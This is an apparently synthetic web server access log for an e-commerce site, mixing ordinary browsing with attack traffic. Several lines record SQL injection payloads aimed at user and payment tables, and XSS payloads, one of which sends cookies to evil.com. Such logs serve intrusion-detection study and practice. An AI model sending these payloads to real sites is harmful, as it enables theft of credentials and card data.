45.152.66.201 - - [15/Jun/2025:00:26:24 +0000] "GET /about HTTP/1.1" 429 789 "-" "curl/8.5.0"
192.168.1.34 - - [15/Jun/2025:00:36:45 +0000] "GET /index.html HTTP/1.1" 200 6973 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
10.0.0.99 - - [15/Jun/2025:00:05:03 +0000] "POST /api/login HTTP/1.1" 401 189 "https://www.ecommerce-site.com/login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.38 - - [15/Jun/2025:00:44:20 +0000] "GET /api/products?category=electronics HTTP/1.1" 304 3913 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.26 - - [15/Jun/2025:00:32:48 +0000] "GET /api/orders HTTP/1.1" 404 1707 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.11 - - [15/Jun/2025:00:47:35 +0000] "GET /search?q=laptop HTTP/1.1" 404 2855 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.1.29 - - [15/Jun/2025:00:55:47 +0000] "POST /api/user/profile HTTP/1.1" 201 3692 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.41 - - [15/Jun/2025:00:31:18 +0000] "POST /static/css/main.css HTTP/1.1" 201 6410 "https://www.ecommerce-site.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.13 - - [15/Jun/2025:00:38:51 +0000] "GET /images/banner.jpg HTTP/1.1" 404 304 "https://www.ecommerce-site.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.24 - - [15/Jun/2025:00:52:50 +0000] "GET /contact HTTP/1.1" 200 7610 "https://www.ecommerce-site.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.17 - - [15/Jun/2025:00:52:02 +0000] "GET /api/products?category=electronics HTTP/1.1" 200 221 "https://www.ecommerce-site.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.1.48 - - [15/Jun/2025:00:44:17 +0000] "GET /images/banner.jpg HTTP/1.1" 200 3558 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.49 - - [15/Jun/2025:00:42:43 +0000] "GET /cart HTTP/1.1" 404 6407 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
203.0.113.77 - - [15/Jun/2025:00:16:39 +0000] "GET /api/products?id=1' UNION SELECT username,password FROM users-- HTTP/1.1" 400 522 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
198.51.100.42 - - [15/Jun/2025:00:21:51 +0000] "GET /api/comment?text=<script>fetch('https://evil.com/?c='+btoa(document.cookie))</script> HTTP/1.1" 400 416 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.1.14 - - [15/Jun/2025:00:40:55 +0000] "GET /contact HTTP/1.1" 200 6750 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
45.152.66.201 - - [15/Jun/2025:00:25:53 +0000] "GET /robots.txt HTTP/1.1" 200 1122 "-" "libwww-perl/6.72"
192.168.1.35 - - [15/Jun/2025:00:27:13 +0000] "GET /api/cart/add HTTP/1.1" 200 2830 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
45.152.66.201 - - [15/Jun/2025:00:26:01 +0000] "GET /search?q=laptop HTTP/1.1" 429 1672 "-" "Go-http-client/1.1"
192.168.1.23 - - [15/Jun/2025:00:52:37 +0000] "GET /api/cart/add HTTP/1.1" 200 2409 "https://www.ecommerce-site.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
10.0.0.99 - - [15/Jun/2025:00:08:37 +0000] "POST /api/login HTTP/1.1" 401 237 "https://www.ecommerce-site.com/login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
45.152.66.201 - - [15/Jun/2025:00:26:23 +0000] "GET /api/user/profile HTTP/1.1" 200 862 "-" "Go-http-client/1.1"
172.16.0.55 - - [15/Jun/2025:00:18:14 +0000] "GET /products?category=1' UNION SELECT credit_card,cvv,expiry FROM payments-- HTTP/1.1" 400 551 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.12 - - [15/Jun/2025:00:50:25 +0000] "POST /api/products?category=clothing HTTP/1.1" 201 6682 "https://www.ecommerce-site.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.16 - - [15/Jun/2025:00:48:41 +0000] "GET /static/js/app.js HTTP/1.1" 200 7324 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.48 - - [15/Jun/2025:00:38:09 +0000] "POST /search?q=laptop HTTP/1.1" 201 1964 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.47 - - [15/Jun/2025:00:36:15 +0000] "GET /about HTTP/1.1" 200 832 "https://www.ecommerce-site.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.1.28 - - [15/Jun/2025:00:35:23 +0000] "POST /index.html HTTP/1.1" 201 5088 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
45.152.66.201 - - [15/Jun/2025:00:26:00 +0000] "GET /static/css/main.css HTTP/1.1" 200 2380 "-" "Wget/1.21.4"
192.168.1.24 - - [15/Jun/2025:00:36:06 +0000] "POST /products HTTP/1.1" 201 1426 "https://www.ecommerce-site.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.19 - - [15/Jun/2025:00:37:17 +0000] "GET /api/user/profile HTTP/1.1" 200 455 "https://www.ecommerce-site.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.47 - - [15/Jun/2025:00:35:20 +0000] "GET /index.html HTTP/1.1" 304 6100 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.10 - - [15/Jun/2025:00:27:46 +0000] "GET /api/orders HTTP/1.1" 200 4767 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.1.34 - - [15/Jun/2025:00:30:23 +0000] "GET /checkout HTTP/1.1" 200 6245 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
45.152.66.201 - - [15/Jun/2025:00:25:56 +0000] "GET /contact HTTP/1.1" 200 3771 "-" "libwww-perl/6.72"
192.168.1.33 - - [15/Jun/2025:00:46:32 +0000] "GET /products HTTP/1.1" 304 7137 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.25 - - [15/Jun/2025:00:51:55 +0000] "POST / HTTP/1.1" 201 7006 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.36 - - [15/Jun/2025:00:36:11 +0000] "GET /robots.txt HTTP/1.1" 404 6820 "https://www.ecommerce-site.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.11 - - [15/Jun/2025:00:33:14 +0000] "GET /cart HTTP/1.1" 200 2057 "https://www.ecommerce-site.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.41 - - [15/Jun/2025:00:40:39 +0000] "GET /favicon.ico HTTP/1.1" 304 3503 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.26 - - [15/Jun/2025:00:33:49 +0000] "GET /products HTTP/1.1" 200 310 "https://www.google.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.1.34 - - [15/Jun/2025:00:28:12 +0000] "GET /favicon.ico HTTP/1.1" 200 2011 "https://www.ecommerce-site.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.27 - - [15/Jun/2025:00:28:33 +0000] "POST /search?q=laptop HTTP/1.1" 201 818 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.31 - - [15/Jun/2025:00:45:28 +0000] "GET /products HTTP/1.1" 304 360 "https://www.ecommerce-site.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
203.0.113.77 - - [15/Jun/2025:00:10:21 +0000] "POST /api/login HTTP/1.1" 401 219 "https://www.ecommerce-site.com/login" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.22 - - [15/Jun/2025:00:30:06 +0000] "GET /api/orders HTTP/1.1" 200 2842 "https://www.ecommerce-site.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
45.152.66.201 - - [15/Jun/2025:00:26:17 +0000] "GET /sitemap.xml HTTP/1.1" 200 1635 "-" "libwww-perl/6.72"
192.168.1.14 - - [15/Jun/2025:00:38:58 +0000] "POST /static/css/main.css HTTP/1.1" 201 704 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
198.51.100.42 - - [15/Jun/2025:00:19:04 +0000] "GET /products?category=1' UNION SELECT credit_card,cvv,expiry FROM payments-- HTTP/1.1" 400 481 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.43 - - [15/Jun/2025:00:49:14 +0000] "GET /index.html HTTP/1.1" 200 3820 "https://www.ecommerce-site.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.30 - - [15/Jun/2025:00:45:43 +0000] "GET /static/css/main.css HTTP/1.1" 200 407 "https://www.ecommerce-site.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.36 - - [15/Jun/2025:00:37:52 +0000] "GET /api/orders HTTP/1.1" 200 3448 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.49 - - [15/Jun/2025:00:27:04 +0000] "GET /contact HTTP/1.1" 200 7297 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
198.51.100.42 - - [15/Jun/2025:00:09:22 +0000] "POST /api/login HTTP/1.1" 401 198 "https://www.ecommerce-site.com/login" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
198.51.100.42 - - [15/Jun/2025:00:11:49 +0000] "POST /api/login HTTP/1.1" 401 213 "https://www.ecommerce-site.com/login" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.45 - - [15/Jun/2025:00:45:49 +0000] "GET /static/js/app.js HTTP/1.1" 200 2903 "https://www.ecommerce-site.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.1.19 - - [15/Jun/2025:00:37:43 +0000] "GET /static/css/main.css HTTP/1.1" 200 3496 "https://www.ecommerce-site.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.1.48 - - [15/Jun/2025:00:57:39 +0000] "GET /products HTTP/1.1" 200 6275 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.38 - - [15/Jun/2025:00:50:53 +0000] "GET /index.html HTTP/1.1" 200 1383 "https://www.ecommerce-site.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.11 - - [15/Jun/2025:00:35:09 +0000] "GET /static/js/app.js HTTP/1.1" 200 2630 "https://www.ecommerce-site.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
45.152.66.201 - - [15/Jun/2025:00:26:16 +0000] "GET /api/user/profile HTTP/1.1" 200 3715 "-" "Wget/1.21.4"
172.16.0.55 - - [15/Jun/2025:00:16:09 +0000] "GET /api/products?id=1' UNION SELECT username,password FROM users-- HTTP/1.1" 400 376 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.1.27 - - [15/Jun/2025:00:42:51 +0000] "GET /api/cart/add HTTP/1.1" 200 893 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.1.31 - - [15/Jun/2025:00:53:25 +0000] "GET /static/css/main.css HTTP/1.1" 200 1883 "https://www.google.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.10 - - [15/Jun/2025:00:39:16 +0000] "GET /robots.txt HTTP/1.1" 200 588 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.1.35 - - [15/Jun/2025:00:37:11 +0000] "GET /cart HTTP/1.1" 404 5429 "https://www.ecommerce-site.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
203.0.113.77 - - [15/Jun/2025:00:15:33 +0000] "POST /api/login HTTP/1.1" 401 210 "https://www.ecommerce-site.com/login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
45.152.66.201 - - [15/Jun/2025:00:26:25 +0000] "GET /static/css/main.css HTTP/1.1" 200 1855 "-" "libwww-perl/6.72"
192.168.1.49 - - [15/Jun/2025:00:56:20 +0000] "GET /images/banner.jpg HTTP/1.1" 404 3242 "https://www.ecommerce-site.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.1.26 - - [15/Jun/2025:00:43:22 +0000] "POST /static/css/main.css HTTP/1.1" 201 7714 "https://www.ecommerce-site.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.11 - - [15/Jun/2025:00:54:57 +0000] "GET /search?q=laptop HTTP/1.1" 200 7330 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.13 - - [15/Jun/2025:00:36:53 +0000] "GET /static/css/main.css HTTP/1.1" 200 3202 "https://www.ecommerce-site.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
172.16.0.55 - - [15/Jun/2025:00:12:55 +0000] "POST /api/login HTTP/1.1" 401 201 "https://www.ecommerce-site.com/login" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.13 - - [15/Jun/2025:00:33:45 +0000] "GET /api/products?category=electronics HTTP/1.1" 200 2005 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
198.51.100.42 - - [15/Jun/2025:00:21:04 +0000] "GET /api/review?text=<body onload=eval(atob('YWxlcnQoMSk='))> HTTP/1.1" 400 432 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.1.12 - - [15/Jun/2025:00:45:29 +0000] "GET /robots.txt HTTP/1.1" 404 2042 "https://www.ecommerce-site.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
10.0.0.99 - - [15/Jun/2025:00:10:55 +0000] "POST /api/login HTTP/1.1" 401 183 "https://www.ecommerce-site.com/login" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.17 - - [15/Jun/2025:00:50:15 +0000] "POST /static/css/main.css HTTP/1.1" 200 325 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
45.152.66.201 - - [15/Jun/2025:00:26:19 +0000] "GET /favicon.ico HTTP/1.1" 200 2439 "-" "Go-http-client/1.1"
203.0.113.77 - - [15/Jun/2025:00:20:55 +0000] "GET /search?q=1' UNION SELECT null,table_name FROM information_schema.tables-- HTTP/1.1" 400 594 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.1.16 - - [15/Jun/2025:00:29:16 +0000] "GET /favicon.ico HTTP/1.1" 200 5978 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.37 - - [15/Jun/2025:00:40:41 +0000] "POST /api/cart/add HTTP/1.1" 201 6680 "https://www.ecommerce-site.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.1.22 - - [15/Jun/2025:00:56:57 +0000] "POST /search?q=laptop HTTP/1.1" 200 949 "https://www.ecommerce-site.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.43 - - [15/Jun/2025:00:52:55 +0000] "GET /api/products?category=electronics HTTP/1.1" 404 2609 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.27 - - [15/Jun/2025:00:47:45 +0000] "GET /index.html HTTP/1.1" 200 1673 "https://www.google.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.10 - - [15/Jun/2025:00:38:10 +0000] "GET /api/products?category=clothing HTTP/1.1" 304 7920 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.1.16 - - [15/Jun/2025:00:55:28 +0000] "GET /search?q=laptop HTTP/1.1" 304 2082 "https://www.ecommerce-site.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.40 - - [15/Jun/2025:00:40:27 +0000] "GET /images/banner.jpg HTTP/1.1" 404 3365 "https://www.ecommerce-site.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.40 - - [15/Jun/2025:00:28:00 +0000] "GET /api/orders HTTP/1.1" 304 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
198.51.100.42 - - [15/Jun/2025:00:03:41 +0000] "POST /api/login HTTP/1.1" 401 185 "https://www.ecommerce-site.com/login" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.1.33 - - [15/Jun/2025:00:42:47 +0000] "POST /contact HTTP/1.1" 201 3895 "https://www.google.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
203.0.113.77 - - [15/Jun/2025:00:13:34 +0000] "POST /api/login HTTP/1.1" 401 215 "https://www.ecommerce-site.com/login" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.30 - - [15/Jun/2025:00:52:30 +0000] "GET /api/products?category=clothing HTTP/1.1" 404 4338 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.28 - - [15/Jun/2025:00:51:26 +0000] "POST / HTTP/1.1" 200 5473 "https://www.google.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
10.0.0.99 - - [15/Jun/2025:00:24:23 +0000] "GET /products?name=<img src=x onerror=alert(document.domain)> HTTP/1.1" 400 389 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
45.152.66.201 - - [15/Jun/2025:00:26:03 +0000] "GET /favicon.ico HTTP/1.1" 200 1990 "-" "Wget/1.21.4"
192.168.1.18 - - [15/Jun/2025:00:52:44 +0000] "GET /api/cart/add HTTP/1.1" 200 5872 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
45.152.66.201 - - [15/Jun/2025:00:26:09 +0000] "GET /static/css/main.css HTTP/1.1" 200 1337 "-" "python-requests/2.31.0"
198.51.100.42 - - [15/Jun/2025:00:25:29 +0000] "GET /api/review?text=<body onload=eval(atob('YWxlcnQoMSk='))> HTTP/1.1" 400 355 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.1.14 - - [15/Jun/2025:00:47:10 +0000] "GET /api/products?category=electronics HTTP/1.1" 304 2300 "https://www.google.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.17 - - [15/Jun/2025:00:52:54 +0000] "GET /images/banner.jpg HTTP/1.1" 200 3270 "https://www.google.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.1.29 - - [15/Jun/2025:00:33:58 +0000] "POST /static/css/main.css HTTP/1.1" 200 2426 "https://www.ecommerce-site.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
198.51.100.42 - - [15/Jun/2025:00:16:14 +0000] "GET /search?q=<script>document.cookie='stolen='+document.cookie</script> HTTP/1.1" 400 481 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.24 - - [15/Jun/2025:00:54:38 +0000] "POST /products HTTP/1.1" 201 4654 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.23 - - [15/Jun/2025:00:44:14 +0000] "GET /api/products?category=clothing HTTP/1.1" 200 1973 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.25 - - [15/Jun/2025:00:43:59 +0000] "GET /robots.txt HTTP/1.1" 404 7490 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.10 - - [15/Jun/2025:00:41:28 +0000] "GET /robots.txt HTTP/1.1" 200 1345 "https://www.ecommerce-site.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
172.16.0.55 - - [15/Jun/2025:00:25:20 +0000] "GET /search?q=1' UNION SELECT null,table_name FROM information_schema.tables-- HTTP/1.1" 400 549 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.15 - - [15/Jun/2025:00:46:22 +0000] "GET /api/orders HTTP/1.1" 404 4267 "https://www.google.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.42 - - [15/Jun/2025:00:45:21 +0000] "POST /search?q=laptop HTTP/1.1" 200 5709 "https://www.ecommerce-site.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
172.16.0.55 - - [15/Jun/2025:00:13:24 +0000] "POST /api/login HTTP/1.1" 401 199 "https://www.ecommerce-site.com/login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.34 - - [15/Jun/2025:00:41:16 +0000] "GET /api/products?category=clothing HTTP/1.1" 304 6485 "https://www.ecommerce-site.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.43 - - [15/Jun/2025:00:35:27 +0000] "GET /api/products?category=clothing HTTP/1.1" 304 3871 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
